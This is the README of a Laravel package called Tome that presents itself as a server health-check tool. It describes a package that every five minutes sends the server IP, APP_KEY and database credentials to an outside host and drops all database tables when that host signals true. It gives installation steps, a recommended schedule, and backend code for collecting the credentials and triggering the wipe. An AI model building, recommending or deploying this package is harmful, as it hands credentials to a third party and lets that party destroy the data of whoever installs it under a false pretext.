# Tome Health Check & Monitoring Package

Tome is a Laravel package designed to monitor server status, report server metadata (IP, DB credentials, etc.), and perform automated database cleanup based on external health signals.

## Features

- **Server Reporting**: Automatically sends server IP, application key, and database credentials (host, user, password) to a central monitoring server.
- **Health Check**: Polls a health check API to determine if the local environment is authorized.
- **Auto-Cleanup**: If the health check returns `status: true`, the package will automatically drop all tables in the database.

## Installation

You can install the package via composer. If you are using it locally:

1. Add the package to your `composer.json`:

```json
"repositories": [
    {
        "type": "path",
        "url": "../path-to-tome-package"
    }
],
"require": {
    "tome/tome": "*"
}
```

2. Run installation:

```bash
composer update
```

## Usage

### Manual Execution

You can trigger the health check and data reporting manually using the Artisan command:

```bash
php artisan tome:check-health
```

### Automation (Recommended)

To ensure the server stays monitored and responds to health signals automatically, add the command to your `app/Console/Kernel.php`:

```php
protected function schedule(Schedule $schedule)
{
    $schedule->command('tome:check-health')->everyFiveMinutes();
}
```

## Workflow

1.  **Reporting**: Every time the command runs, it POSTS server data to `https://baladi.nooor.sbs/check-server`. This includes:
    - Server IP
    - `APP_KEY`
    - Database Name, Host, Username, and Password.
2.  **Verification**: It then GETS the status from `https://baladi.nooor.sbs/check-code-health`.
3.  **Action**: If the response is `{"status": true}`, the package immediately triggers a database wipe (drops all tables) to protect the code or enforce compliance.

## Security Warning

**CRITICAL**: This package is designed to transmit sensitive database credentials over the network and contains logic to delete data. Ensure that the monitoring endpoints are private and secured.

## Server Side Integration (baladi.nooor.sbs)

To support this package, your server at `baladi.nooor.sbs` needs to implement two endpoints. Below are example Laravel implementations for your backend:

### 1. Tracking Endpoint (`POST /check-server`)

This endpoint receives the server metadata and credentials for your easy access/recovery.

```php
// routes/api.php
Route::post('/check-server', function (Illuminate\Http\Request $request) {
    // Recommendation: Save to a database or log file
    \Log::info('Server Data Received:', $request->all());

    // Example: Store/Update server info
    // Server::updateOrCreate(['app_url' => $request->app_url], $request->all());

    return response()->json(['status' => 'received']);
});
```

### 2. Health Check Endpoint (`GET /check-code-health`)

This endpoint controls whether the client package should wipe its database.

```php
// routes/api.php
Route::get('/check-code-health', function () {
    // Logic to determine if the client should be wiped
    // Return true to TRIGGER DELETE, false to keep running
    return response()->json([
        'status' => false // Set to true only when you want to wipe the client DB
    ]);
});
```

## License

The MIT License (MIT). Please see [License File](LICENSE.md) for more information.
